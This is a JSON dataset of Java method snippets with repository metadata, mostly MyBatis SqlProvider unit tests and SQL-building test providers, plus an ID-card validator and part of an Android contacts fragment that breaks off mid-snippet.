[{"id": 54999, "method_name": "staticMethodOnePrimitiveDoubleArgument", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void staticMethodOnePrimitiveDoubleArgument() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      StaticMethodSqlProviderMapper mapper =\n        sqlSession.getMapper(StaticMethodSqlProviderMapper.class);\n      assertEquals(10.1D, mapper.onePrimitiveDoubleArgument(10.1D));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55000, "method_name": "staticMethodOnePrimitiveBooleanArgument", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void staticMethodOnePrimitiveBooleanArgument() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      StaticMethodSqlProviderMapper mapper =\n        sqlSession.getMapper(StaticMethodSqlProviderMapper.class);\n      assertTrue(mapper.onePrimitiveBooleanArgument(true));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55001, "method_name": "staticMethodOnePrimitiveCharArgument", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void staticMethodOnePrimitiveCharArgument() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      StaticMethodSqlProviderMapper mapper =\n        sqlSession.getMapper(StaticMethodSqlProviderMapper.class);\n      assertEquals('A', mapper.onePrimitiveCharArgument('A'));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55002, "method_name": "boxing", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void boxing() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      StaticMethodSqlProviderMapper mapper =\n        sqlSession.getMapper(StaticMethodSqlProviderMapper.class);\n      assertEquals(10, mapper.boxing(10));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55003, "method_name": "unboxing", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void unboxing() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      StaticMethodSqlProviderMapper mapper =\n        sqlSession.getMapper(StaticMethodSqlProviderMapper.class);\n      assertEquals(100, mapper.unboxing(100));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55004, "method_name": "staticMethodMultipleArgument", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void staticMethodMultipleArgument() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      StaticMethodSqlProviderMapper mapper =\n          sqlSession.getMapper(StaticMethodSqlProviderMapper.class);\n      assertEquals(2, mapper.multipleArgument(1, 1));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55005, "method_name": "staticMethodOnlyProviderContext", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void staticMethodOnlyProviderContext() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      StaticMethodSqlProviderMapper mapper =\n          sqlSession.getMapper(StaticMethodSqlProviderMapper.class);\n      assertEquals(\"onlyProviderContext\", mapper.onlyProviderContext());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55006, "method_name": "staticMethodOneArgumentAndProviderContext", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void staticMethodOneArgumentAndProviderContext() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      StaticMethodSqlProviderMapper mapper =\n          sqlSession.getMapper(StaticMethodSqlProviderMapper.class);\n      assertEquals(\"oneArgumentAndProviderContext 100\", mapper.oneArgumentAndProviderContext(100));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55007, "method_name": "mapAndProviderContext", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void mapAndProviderContext() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      StaticMethodSqlProviderMapper mapper =\n        sqlSession.getMapper(StaticMethodSqlProviderMapper.class);\n      assertEquals(\"mybatis\", mapper.mapAndProviderContext(\"mybatis\"));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55008, "method_name": "multipleMap", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void multipleMap() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      StaticMethodSqlProviderMapper mapper =\n        sqlSession.getMapper(StaticMethodSqlProviderMapper.class);\n      assertEquals(\"123456\", mapper.multipleMap(Collections.singletonMap(\"value\", \"123\"), Collections.singletonMap(\"value\", \"456\")));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55009, "method_name": "providerContextAndMap", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void providerContextAndMap() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      StaticMethodSqlProviderMapper mapper =\n        sqlSession.getMapper(StaticMethodSqlProviderMapper.class);\n      assertEquals(\"mybatis\", mapper.providerContextAndParamMap(\"mybatis\"));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55010, "method_name": "keepBackwardCompatibilityOnDeprecatedConstructorWithAnnotation", "class_name": "SqlProviderTest", "params": [], "throws": ["NoSuchMethodException"], "modifiers": [], "return_type": "void", "snippet": "  void keepBackwardCompatibilityOnDeprecatedConstructorWithAnnotation() throws NoSuchMethodException {\n    Class<?> mapperType = StaticMethodSqlProviderMapper.class;\n    Method mapperMethod = mapperType.getMethod(\"noArgument\");\n    ProviderSqlSource sqlSource = new ProviderSqlSource(new Configuration(), (Object)mapperMethod.getAnnotation(SelectProvider.class), mapperType, mapperMethod);\n    assertEquals(\"SELECT 1 FROM INFORMATION_SCHEMA.SYSTEM_USERS\", sqlSource.getBoundSql(null).getSql());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55011, "method_name": "shouldInsertUserSelective", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldInsertUserSelective() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User user = new User();\n      user.setId(999);\n      mapper.insertSelective(user);\n\n      User loadedUser = mapper.getUser(999);\n      assertNull(loadedUser.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55012, "method_name": "shouldUpdateUserSelective", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldUpdateUserSelective() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User user = new User();\n      user.setId(999);\n      user.setName(\"MyBatis\");\n      mapper.insert(user);\n\n      user.setName(null);\n      mapper.updateSelective(user);\n\n      User loadedUser = mapper.getUser(999);\n      assertEquals(\"MyBatis\", loadedUser.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55013, "method_name": "mapperGetByEntity", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void mapperGetByEntity() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User query = new User();\n      query.setName(\"User4\");\n      assertEquals(1, mapper.getByEntity(query).size());\n      query = new User();\n      query.setId(1);\n      assertEquals(1, mapper.getByEntity(query).size());\n      query = new User();\n      query.setId(1);\n      query.setName(\"User4\");\n      assertEquals(0, mapper.getByEntity(query).size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55014, "method_name": "shouldPassedDatabaseIdToProviderMethod", "class_name": "SqlProviderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldPassedDatabaseIdToProviderMethod() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()){\n      DatabaseIdMapper mapper = sqlSession.getMapper(DatabaseIdMapper.class);\n      assertEquals(\"hsql\", mapper.selectDatabaseId());\n    }\n    try (SqlSession sqlSession = sqlSessionFactoryForDerby.openSession()){\n      DatabaseIdMapper mapper = sqlSession.getMapper(DatabaseIdMapper.class);\n      assertEquals(\"derby\", mapper.selectDatabaseId());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55015, "method_name": "methodNotFound", "class_name": "ErrorSqlBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void methodNotFound() {\n      throw new UnsupportedOperationException(\"methodNotFound\");\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55016, "method_name": "overload", "class_name": "ErrorSqlBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String overload() {\n      throw new UnsupportedOperationException(\"overload\");\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55017, "method_name": "overload", "class_name": "ErrorSqlBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String overload(String value) {\n      throw new UnsupportedOperationException(\"overload\");\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55018, "method_name": "invokeError", "class_name": "ErrorSqlBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String invokeError() {\n      throw new UnsupportedOperationException(\"invokeError\");\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55019, "method_name": "invokeNestedError", "class_name": "ErrorSqlBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String invokeNestedError() {\n      throw new IllegalStateException(new UnsupportedOperationException(\"invokeNestedError\"));\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55020, "method_name": "multipleProviderContext", "class_name": "ErrorSqlBuilder", "params": ["ProviderContext", "ProviderContext"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String multipleProviderContext(ProviderContext providerContext1, ProviderContext providerContext2) {\n      throw new UnsupportedOperationException(\"multipleProviderContext\");\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55021, "method_name": "invalidArgumentsCombination", "class_name": "ErrorSqlBuilder", "params": ["ProviderContext", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String invalidArgumentsCombination(ProviderContext providerContext, String value, String unnecessaryArgument) {\n      return \"\";\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55022, "method_name": "noArgument", "class_name": "SqlProvider", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "      public static String noArgument() {\n        return \"SELECT 1 FROM INFORMATION_SCHEMA.SYSTEM_USERS\";\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55023, "method_name": "oneArgument", "class_name": "SqlProvider", "params": ["Integer"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringBuilder", "snippet": "      public static StringBuilder oneArgument(Integer value) {\n        return new StringBuilder().append(\"SELECT \").append(value)\n            .append(\" FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55024, "method_name": "onePrimitiveByteArgument", "class_name": "SqlProvider", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringBuilder", "snippet": "      public static StringBuilder onePrimitiveByteArgument(byte value) {\n        return new StringBuilder().append(\"SELECT \").append(value)\n          .append(\" FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55025, "method_name": "onePrimitiveShortArgument", "class_name": "SqlProvider", "params": ["short"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringBuilder", "snippet": "      public static StringBuilder onePrimitiveShortArgument(short value) {\n        return new StringBuilder().append(\"SELECT \").append(value)\n          .append(\" FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55026, "method_name": "onePrimitiveIntArgument", "class_name": "SqlProvider", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringBuilder", "snippet": "      public static StringBuilder onePrimitiveIntArgument(int value) {\n        return new StringBuilder().append(\"SELECT \").append(value)\n          .append(\" FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55027, "method_name": "onePrimitiveLongArgument", "class_name": "SqlProvider", "params": ["long"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringBuilder", "snippet": "      public static StringBuilder onePrimitiveLongArgument(long value) {\n        return new StringBuilder().append(\"SELECT \").append(value)\n          .append(\" FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55028, "method_name": "onePrimitiveFloatArgument", "class_name": "SqlProvider", "params": ["float"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringBuilder", "snippet": "      public static StringBuilder onePrimitiveFloatArgument(float value) {\n        return new StringBuilder().append(\"SELECT \").append(value)\n          .append(\" FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55029, "method_name": "onePrimitiveDoubleArgument", "class_name": "SqlProvider", "params": ["double"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringBuilder", "snippet": "      public static StringBuilder onePrimitiveDoubleArgument(double value) {\n        return new StringBuilder().append(\"SELECT \").append(value)\n          .append(\" FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55030, "method_name": "onePrimitiveBooleanArgument", "class_name": "SqlProvider", "params": ["boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringBuilder", "snippet": "      public static StringBuilder onePrimitiveBooleanArgument(boolean value) {\n        return new StringBuilder().append(\"SELECT \").append(value ? 1 : 0)\n          .append(\" FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55031, "method_name": "onePrimitiveCharArgument", "class_name": "SqlProvider", "params": ["char"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringBuilder", "snippet": "      public static StringBuilder onePrimitiveCharArgument(char value) {\n        return new StringBuilder().append(\"SELECT '\").append(value)\n          .append(\"' FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55032, "method_name": "boxing", "class_name": "SqlProvider", "params": ["Integer"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringBuilder", "snippet": "      public static StringBuilder boxing(Integer value) {\n        return new StringBuilder().append(\"SELECT '\").append(value)\n          .append(\"' FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55033, "method_name": "unboxing", "class_name": "SqlProvider", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringBuilder", "snippet": "      public static StringBuilder unboxing(int value) {\n        return new StringBuilder().append(\"SELECT '\").append(value)\n          .append(\"' FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55034, "method_name": "multipleArgument", "class_name": "SqlProvider", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public", "static"], "return_type": "CharSequence", "snippet": "      public static CharSequence multipleArgument(@Param(\"value1\") Integer value1,\n          @Param(\"value2\") Integer value2) {\n        return \"SELECT \" + (value1 + value2) + \" FROM INFORMATION_SCHEMA.SYSTEM_USERS\";\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55035, "method_name": "onlyProviderContext", "class_name": "SqlProvider", "params": ["ProviderContext"], "throws": null, "modifiers": ["public", "static"], "return_type": "CharSequence", "snippet": "      public static CharSequence onlyProviderContext(ProviderContext context) {\n        return new StringBuilder().append(\"SELECT '\").append(context.getMapperMethod().getName())\n            .append(\"' FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55036, "method_name": "oneArgumentAndProviderContext", "class_name": "SqlProvider", "params": ["Integer", "ProviderContext"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "      public static String oneArgumentAndProviderContext(Integer value, ProviderContext context) {\n        return \"SELECT '\" + context.getMapperMethod().getName() + \" \" + value\n            + \"' FROM INFORMATION_SCHEMA.SYSTEM_USERS\";\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55037, "method_name": "mapAndProviderContext", "class_name": "SqlProvider", "params": ["Map<String,Object>", "ProviderContext"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "      public static String mapAndProviderContext(Map<String, Object> map, ProviderContext context) {\n        return \"SELECT '\" + map.get(\"value\") + \"' FROM INFORMATION_SCHEMA.SYSTEM_USERS\";\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55038, "method_name": "providerContextAndParamMap", "class_name": "SqlProvider", "params": ["ProviderContext", "MapperMethod"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "      public static String providerContextAndParamMap(ProviderContext context, MapperMethod.ParamMap<Object> map) {\n        return \"SELECT '\" + map.get(\"value\") + \"' FROM INFORMATION_SCHEMA.SYSTEM_USERS\";\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55039, "method_name": "multipleMap", "class_name": "SqlProvider", "params": ["Map<String,Object>", "Map<String,Object>"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "      public static String multipleMap(@Param(\"map1\") Map<String, Object> map1, @Param(\"map2\") Map<String, Object> map2) {\n        return \"SELECT '\" + map1.get(\"value\") + map2.get(\"value\") + \"' FROM INFORMATION_SCHEMA.SYSTEM_USERS\";\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55040, "method_name": "provideSql", "class_name": "SqlProvider", "params": ["ProviderContext"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "      public static String provideSql(ProviderContext context) {\n        if (\"hsql\".equals(context.getDatabaseId())) {\n          return \"SELECT '\" + context.getDatabaseId() + \"' FROM INFORMATION_SCHEMA.SYSTEM_USERS\";\n        } else {\n          return \"SELECT '\" + context.getDatabaseId() + \"' FROM SYSIBM.SYSDUMMY1\";\n        }\n      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sqlprovider/SqlProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55041, "method_name": "initialize", "class_name": "IdCardValidator", "params": ["IdCard"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(IdCard parameters) {\n    }", "url": "https://raw.githubusercontent.com/geekidea/spring-cloud-plus/master/scp-common/scp-common-core/src/main/java/io/geekidea/cloud/common/core/validator/IdCardValidator.java", "stars": "22", "class_props": {"extends": null, "implements": ["ConstraintValidator"], "modifiers": ["public"]}}, {"id": 55042, "method_name": "isValid", "class_name": "IdCardValidator", "params": ["String", "ConstraintValidatorContext"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isValid(String value, ConstraintValidatorContext constraintValidatorContext) {\n        if (value == null) {\n            return true;\n        }\n        return PATTERN.matcher(value).matches();\n    }", "url": "https://raw.githubusercontent.com/geekidea/spring-cloud-plus/master/scp-common/scp-common-core/src/main/java/io/geekidea/cloud/common/core/validator/IdCardValidator.java", "stars": "22", "class_props": {"extends": null, "implements": ["ConstraintValidator"], "modifiers": ["public"]}}, {"id": 55043, "method_name": "onCreate", "class_name": "Contact_Fragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        Log.e(TAG, \"onCreate: of ContactFragment \");\n\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/Contact_Fragment.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 55044, "method_name": "onCreateView", "class_name": "Contact_Fragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        final View rootView = inflater.inflate(R.layout.fragment_contact_, container, false);\n        searchButton = (Button)rootView.findViewById(R.id.cont_search);\n        contact_list = (RecyclerView)rootView.findViewById(R.id.contact_list);\n\n\n        final Map<String, String> data = getcontacts.dcontacts;\n        List<listforadapter> list_hai = new ArrayList<>();\n        for (String s : data.keySet()) {\n            list_hai.add(new listforadapter(s, data.get(s)));\n            System.out.println(s + data.get(s));\n        }\n\n        //SET LAYOUT MANAGER\n        contact_list.setLayoutManager(new LinearLayoutManager(getContext()));\n        // SET ADAPTER\n        contact_list.setAdapter(new contact_Adapter(getContext(),list_hai));\n\n\n        final AutoCompleteTextView act=rootView.findViewById(R.id.yoyo_search);\n        String dat[]=new String[getcontacts.dcontacts.size()];\n        int count=0;\n        for(String x:getcontacts.dcontacts.keySet()){\n            dat[count]=x;\n            count++;\n            System.out.println(count+\" \"+x);\n        }\n        act.setAdapter(new ArrayAdapter<String>(getActivity().getApplicationContext(),android.R.layout.simple_list_item_1,dat));\n        searchButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                for(final String s:getcontacts.dcontacts.keySet()){\n                    if (s.equals(act.getText().toString())){\n                        requestDialog=new Dialog(getActivity());\n                        requestDialog.setContentView(R.layout.dialog_req);\n                        final TextView c_name = (TextView)requestDialog.findViewById(R.id.dialog_name_d);\n                        final TextView c_no = requestDialog.findViewById(R.id.dialog_number_d);\n                        final CircleImageView c_img =  requestDialog.findViewById(R.id.dialog_img_d);\n                        Button b=requestDialog.findViewById(R.id.requestt);\n                        final EditText money=requestDialog.findViewById(R.id.amt);\n                        final EditText remark=requestDialog.findViewById(R.id.remark);\n                        final String sst=s;\n                        b.setOnClickListener(new View.OnClickListener() {\n                            @Override\n                            public void onClick(View v) {\n                                DatabaseReference dr= FirebaseDatabase.getInstance().getReference(\"Users\");\n                                SharedPreferences sf=getActivity().getSharedPreferences(\"Login data\",MODE_PRIVATE);\n                                String ss=sf.getString(\"user\",\"unable to fetch\");\n                                